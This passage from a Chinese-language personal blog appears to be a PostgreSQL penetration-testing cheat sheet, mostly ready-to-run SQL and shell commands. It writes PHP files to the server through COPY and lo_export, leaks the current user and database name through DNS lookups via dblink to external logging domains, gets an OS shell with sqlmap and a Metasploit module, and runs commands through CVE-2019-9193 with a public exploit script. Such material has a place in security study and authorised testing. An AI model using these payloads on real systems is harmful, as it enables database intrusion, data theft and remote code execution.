+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e424ed2ff6683777f8c2846af40ab5dd4a7e1edb5c3b2093fd886414458c30fe/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3435333732616635343038662e706e67"><img src="https://camo.githubusercontent.com/e424ed2ff6683777f8c2846af40ab5dd4a7e1edb5c3b2093fd886414458c30fe/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3435333732616635343038662e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/45372af5408f.png" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/119bd7491a41c4ffd5c8b356c3ff60c5bb0bc91b5bbea6351ff9f861c084a127/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6364646263303864346432392e77656270"><img src="https://camo.githubusercontent.com/119bd7491a41c4ffd5c8b356c3ff60c5bb0bc91b5bbea6351ff9f861c084a127/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6364646263303864346432392e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/cddbc08d4d29.webp" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span>遇到特殊字符也可以采用编码的方式写入 </span>
+COPY (<span class="pl-k">select</span> convert_from(decode(<span class="pl-s"><span class="pl-pds">'</span>PD9waHAgcGhwaW5mbygpOz8+<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>base64<span class="pl-pds">'</span></span>),<span class="pl-s"><span class="pl-pds">'</span>utf-8<span class="pl-pds">'</span></span>)) to <span class="pl-s"><span class="pl-pds">'</span>/tmp/2.php<span class="pl-pds">'</span></span>;</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/70825b9dafcd51edfbd0f4d7272d5cc188381ea0608c88d75099dc072ddd5048/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6639616332333765343964342e706e67"><img src="https://camo.githubusercontent.com/70825b9dafcd51edfbd0f4d7272d5cc188381ea0608c88d75099dc072ddd5048/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6639616332333765343964342e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f9ac237e49d4.png" style="max-width: 100%;"></a></p>
+<h2>lo_export命令</h2>
+<p>采用大对象 OID 和路径，将文件写入路径。</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">SELECT</span> lo_from_bytea(<span class="pl-c1">12349</span>,<span class="pl-s"><span class="pl-pds">'</span>&lt;?php phpinfo();?&gt;<span class="pl-pds">'</span></span>);</pre></div>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">SELECT</span> lo_export(<span class="pl-c1">12349</span>, <span class="pl-s"><span class="pl-pds">'</span>/tmp/3.php<span class="pl-pds">'</span></span>);</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/8efd6786fe47da852c200f2b085ad6debe76596b2b06689e0161d47b15772dfa/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3037636161386565626131392e706e67"><img src="https://camo.githubusercontent.com/8efd6786fe47da852c200f2b085ad6debe76596b2b06689e0161d47b15772dfa/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3037636161386565626131392e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/07caa8eeba19.png" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span> base64 的形式 </span>
+<span class="pl-k">SELECT</span> lo_from_bytea(<span class="pl-c1">12350</span>,decode(<span class="pl-s"><span class="pl-pds">'</span>PD9waHAgcGhwaW5mbygpOz8+<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>base64<span class="pl-pds">'</span></span>)); 
+<span class="pl-k">SELECT</span> lo_export(<span class="pl-c1">12350</span>, <span class="pl-s"><span class="pl-pds">'</span>/tmp/4.php<span class="pl-pds">'</span></span>);</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/cf2747bbdd848c1de69c3391b1933f9329fdcd66292edc4b55622ee708916413/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3737643638663264303463642e706e67"><img src="https://camo.githubusercontent.com/cf2747bbdd848c1de69c3391b1933f9329fdcd66292edc4b55622ee708916413/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3737643638663264303463642e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/77d68f2d04cd.png" style="max-width: 100%;"></a></p>
+<h2>lo_export + pg_largeobject</h2>
+<p>这是 PostgreSQL 利用大对象写文件的另一种手法，跟 lo_from_bytea 思路一样，但更底层，直接操作 pg_largeobject 系统表。</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span> 第一步，创建一个空的大对象，记下生成的lo_creat ID </span>
+<span class="pl-k">SELECT</span> lo_creat(<span class="pl-k">-</span><span class="pl-c1">1</span>); 
+<span class="pl-c"><span class="pl-c">--</span> 第二步，往大对象里写数据，替换 24577 为生成的lo_creat ID </span>
+<span class="pl-k">INSERT INTO</span> pg_largeobject(loid, pageno, data) <span class="pl-k">values</span> (<span class="pl-c1">24577</span>, <span class="pl-c1">0</span>,decode(<span class="pl-s"><span class="pl-pds">'</span>ZmZmZmZmZmYweA==<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>base64<span class="pl-pds">'</span></span>)); 
+<span class="pl-c"><span class="pl-c">--</span> 第三步，导出到服务器文件系统： </span>
+<span class="pl-k">select</span> lo_export(<span class="pl-c1">24577</span>, <span class="pl-s"><span class="pl-pds">'</span>/tmp/success.txt<span class="pl-pds">'</span></span>);</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3d61c4898ed87e4478e013e004f1d32e99f171818bd3e5f9203c12e3cfec9594/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3662306562323131383166322e706e67"><img src="https://camo.githubusercontent.com/3d61c4898ed87e4478e013e004f1d32e99f171818bd3e5f9203c12e3cfec9594/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3662306562323131383166322e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6b0eb21181f2.png" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2427845038af762b42cf0e0d1f5f8fc006b66d20dfd31e6661e8cf9f4407a1ee/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3962336235643439363938622e706e67"><img src="https://camo.githubusercontent.com/2427845038af762b42cf0e0d1f5f8fc006b66d20dfd31e6661e8cf9f4407a1ee/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3962336235643439363938622e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9b3b5d49698b.png" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ca2302ef443bb350f409b62130f6c5942ae0c9fede81c2d65d4209c36de4fd86/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3831663633373537323930342e77656270"><img src="https://camo.githubusercontent.com/ca2302ef443bb350f409b62130f6c5942ae0c9fede81c2d65d4209c36de4fd86/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3831663633373537323930342e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/81f637572904.webp" style="max-width: 100%;"></a></p>
+<h2>Postgresql带外数据</h2>
+<p>简单说就是：当你没法直接在查询结果里看到数据（比如盲注、无回显）时，通过<strong>让数据库主动和你的服务器通信</strong>，把数据 “带出来” 的一种攻击 / 利用技术。</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span> 开启 dblink 扩展 </span>
+CREATE EXTENSION dblink; 
+<span class="pl-c"><span class="pl-c">--</span> 获取当前数据库用户名称 </span>
+<span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> dblink(<span class="pl-s"><span class="pl-pds">'</span>host=<span class="pl-pds">'</span></span><span class="pl-k">||</span>(<span class="pl-k">select</span> user)<span class="pl-k">||</span><span class="pl-s"><span class="pl-pds">'</span>.djw0pg.dnslog.cn user=test dbname=test<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>SELECT version()<span class="pl-pds">'</span></span>) RETURNS (result <span class="pl-k">TEXT</span>);</pre></div>
+<p>把原来的 <code class="notranslate">djw0pg.dnslog.cn</code> 换成你自己的 <a href="https://dig.pm/" rel="nofollow">https://dig.pm/</a> 域名，同时把要带出的数据拼到前面：</p>
+<h2>示例：带出当前用户名</h2>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> dblink(<span class="pl-s"><span class="pl-pds">'</span>host=<span class="pl-pds">'</span></span> <span class="pl-k">||</span> (<span class="pl-k">select</span> user) <span class="pl-k">||</span> <span class="pl-s"><span class="pl-pds">'</span>.你的ID.dig.pm user=test dbname=test<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>SELECT version()<span class="pl-pds">'</span></span>) RETURNS (result <span class="pl-k">TEXT</span>);</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4e67e099f3b640cc716d625b38147a7b92b98989d98f8a5cafba245dde2b774a/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3334303433363466663964312e77656270"><img src="https://camo.githubusercontent.com/4e67e099f3b640cc716d625b38147a7b92b98989d98f8a5cafba245dde2b774a/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3334303433363466663964312e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3404364ff9d1.webp" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> dblink(<span class="pl-s"><span class="pl-pds">'</span>host=<span class="pl-pds">'</span></span><span class="pl-k">||</span>(<span class="pl-k">select</span> user)<span class="pl-k">||</span><span class="pl-s"><span class="pl-pds">'</span>.6fce4fca32.ddns.bypass.eu.org. user=test dbname=test<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>SELECT version()<span class="pl-pds">'</span></span>) RETURNS (result <span class="pl-k">TEXT</span>);</pre></div>
+<p>在无回显 / 盲注场景里非常关键，目标 PostgreSQL 服务器<strong>成功发起了 DNS 请求，把你要查询的数据拼进了域名里，平台也成功收到了。</strong></p>
+<h2>示例：带出当前数据库名</h2>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> dblink(<span class="pl-s"><span class="pl-pds">'</span>host=<span class="pl-pds">'</span></span><span class="pl-k">||</span>(<span class="pl-k">SELECT</span> current_database())<span class="pl-k">||</span><span class="pl-s"><span class="pl-pds">'</span>.6fce4fca32.ddns.bypass.eu.org. user=test dbname=test<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>SELECT version()<span class="pl-pds">'</span></span>) RETURNS (result <span class="pl-k">TEXT</span>);</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/0574f43d47cc69e295a67c540427a49cb4ed57e5384dad9fd5898b31eafcc712/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3038623831356665633137392e77656270"><img src="https://camo.githubusercontent.com/0574f43d47cc69e295a67c540427a49cb4ed57e5384dad9fd5898b31eafcc712/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3038623831356665633137392e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/08b815fec179.webp" style="max-width: 100%;"></a></p>
+<p>这边数据库名和用户名一样</p>
+<h2>Postgresql命令执行</h2>
+<p>如果postgres服务账户具备/tmp目录的写入权限，那么我们可以通过用户自定义函数(UDF，</p>
+<p>user defined functions)实现任意代码执行。</p>
+<h2>使用sqlmap进行udf提权</h2>
+<div class="highlight highlight-source-shell"><pre class="notranslate">sqlmap -d <span class="pl-s"><span class="pl-pds">"</span>PostgreSQL://postgres:postgres@10.3.4.52:5432/postgres<span class="pl-pds">"</span></span> --os-shell</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/578feab6c728921fbf1383e4aa3c81adeecbce27dad15988799799c37378457d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3838633162353263316535332e77656270"><img src="https://camo.githubusercontent.com/578feab6c728921fbf1383e4aa3c81adeecbce27dad15988799799c37378457d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3838633162353263316535332e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/88c1b52c1e53.webp" style="max-width: 100%;"></a></p>
+<h2>使用msf模块 exploit/linux/postgres/postgres_payload</h2>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4aa460a9104e389f3fdb730b9c1fdd08c11c8ab575656e130f199dbbfca53fbf/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6531613538323030396338642e77656270"><img src="https://camo.githubusercontent.com/4aa460a9104e389f3fdb730b9c1fdd08c11c8ab575656e130f199dbbfca53fbf/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6531613538323030396338642e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e1a582009c8d.webp" style="max-width: 100%;"></a></p>
+<h2>Postgresql <a title="CVE-2019-9193" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-j83j-hfqj-cf5p/hovercard" href="https://github.com/advisories/GHSA-j83j-hfqj-cf5p">CVE-2019-9193</a></h2>
+<p>从9.3版本开始，Postgres新增了一个COPY TO/FROM PROGRAM功能，允许数据库的超级用户以及pg_read_server_files组中的任何用户执行操作系统命令</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">DROP</span> <span class="pl-k">TABLE</span> IF EXISTS cmd_exec; 
+<span class="pl-k">CREATE</span> <span class="pl-k">TABLE</span> <span class="pl-en">cmd_exec</span>(cmd_output <span class="pl-k">text</span>); 
+COPY cmd_exec <span class="pl-k">FROM</span> PROGRAM <span class="pl-s"><span class="pl-pds">'</span>id<span class="pl-pds">'</span></span>; 
+<span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> cmd_exec;</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/72a142447e5d9c2784dfd0007fcb91e252b477187d765e9b154edfaa4423a6b1/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3131393433326166623831332e706e67"><img src="https://camo.githubusercontent.com/72a142447e5d9c2784dfd0007fcb91e252b477187d765e9b154edfaa4423a6b1/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3131393433326166623831332e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/119432afb813.png" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5b3016a98882a663bed20ea4fd5c1bf8fdbbe13f9ef1eecec26f1d661d7e93a3/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6137316533646534343134382e706e67"><img src="https://camo.githubusercontent.com/5b3016a98882a663bed20ea4fd5c1bf8fdbbe13f9ef1eecec26f1d661d7e93a3/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6137316533646534343134382e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a71e3de44148.png" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/81e1fb9fafd3cb029b34fd606c86ec49ca35cc0b54ac0ca16991068e72b96ece/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6636306131383066376362302e706e67"><img src="https://camo.githubusercontent.com/81e1fb9fafd3cb029b34fd606c86ec49ca35cc0b54ac0ca16991068e72b96ece/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6636306131383066376362302e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f60a180f7cb0.png" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/fbda1360930c1b8b3be3f2e43d7d1983efa06abc0e56095f60dcdac5d034847a/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3235373764303930346134392e706e67"><img src="https://camo.githubusercontent.com/fbda1360930c1b8b3be3f2e43d7d1983efa06abc0e56095f60dcdac5d034847a/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3235373764303930346134392e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/2577d0904a49.png" style="max-width: 100%;"></a></p>
+<p><strong>github脚本 <a href="https://github.com/b4keSn4ke/CVE-2019-9193">https://github.com/b4keSn4ke/CVE-2019-9193</a></strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">python3 cve-2019-9193.py -i <span class="pl-k">&lt;</span>target_ip<span class="pl-k">&gt;</span> -p <span class="pl-k">&lt;</span>target_port<span class="pl-k">&gt;</span> -U <span class="pl-k">&lt;</span>username<span class="pl-k">&gt;</span> -P <span class="pl-k">&lt;</span>passwd<span class="pl-k">&gt;</span> -c <span class="pl-k">&lt;</span>command<span class="pl-k">&gt;</span></pre></div>
+<div class="highlight highlight-source-shell"><pre class="notranslate">python3 cve-2019-9193.py -i 10.3.4.84 -p 5432 -U postgres -P postgres -d template1 -c <span class="pl-s"><span class="pl-pds">'</span>whoami<span class="pl-pds">'</span></span></pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/81f8dbed25cc56a9c1cb1ad94137eea3bd453b2a65663f4b6e087262708c3b1c/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6330656236353461316463642e706e67"><img src="https://camo.githubusercontent.com/81f8dbed25cc56a9c1cb1ad94137eea3bd453b2a65663f4b6e087262708c3b1c/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6330656236353461316463642e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c0eb654a1dcd.png" style="max-width: 100%;"></a></p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://P7IVESC.github.io">P7IVESC's blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行 "+diffDay+" 天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek v2.25 https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","P7IVESC/P7IVESC.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
